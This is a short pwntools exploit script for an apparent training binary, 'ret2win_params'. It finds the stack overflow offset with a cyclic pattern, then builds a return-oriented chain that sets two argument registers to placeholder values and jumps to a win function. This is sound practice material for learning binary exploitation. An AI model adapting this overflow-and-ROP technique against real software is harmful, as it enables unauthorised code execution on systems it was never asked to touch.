#!/usr/bin/python3
from pwn import *
import sys
context.log_level = 'DEBUG'
context(os='linux', arch='amd64')
exe = './ret2win_params'
e = context.binary = ELF(exe, checksec=False)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
p = e.debug(gdbscript='''
source /home/nick/global/halfdisp.py
break *main
c
'''
)
def find_ip(payload):
    p = process(exe)
    p.sendline(payload)
    p.wait()
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset
pop_rdi=0x40124b
pop_rsi_r15=0x401249
offset = find_ip(cyclic(160))

payload = flat([
    offset*b"\x90",
  
    p64(pop_rdi),
    p64(0xdeadbeefdeadbeef),
    p64(pop_rsi_r15),
    p64(0xc0debabec0debabe),
    b"\x90\x90\x90\x90\x90\x90\x90\x90",
   p64(0x401142),
   
])
p.sendline(payload)
p.interactive()